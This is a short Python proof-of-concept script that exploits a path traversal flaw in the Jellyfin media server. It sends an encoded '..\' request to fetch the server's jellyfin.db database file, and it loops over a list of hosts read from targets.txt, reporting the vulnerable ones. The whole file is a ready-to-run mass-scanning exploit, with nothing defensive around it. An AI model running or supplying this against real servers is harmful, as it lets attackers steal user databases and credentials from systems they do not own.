import requests
import sys
from requests.packages.urllib3.exceptions import InsecureRequestWarning


def POC(url):
    vulpath = "/Audio/anything/hls/..%5Cdata%5Cjellyfin.db/stream.mp3/"
    target = "http://" + url + vulpath
    # print("正在请求：".format(target))
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "accept": "application/json",
        "Accept-Encoding":"gzip, deflate",

    }
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.get(target,headers=headers)
        if response.status_code == 200:
            print("success!",target)
        else:pass
    except:pass



if __name__ == '__main__':
    f = open("targets.txt",'r')
    lines = f.readlines()
    for line in lines:
        POC(line)
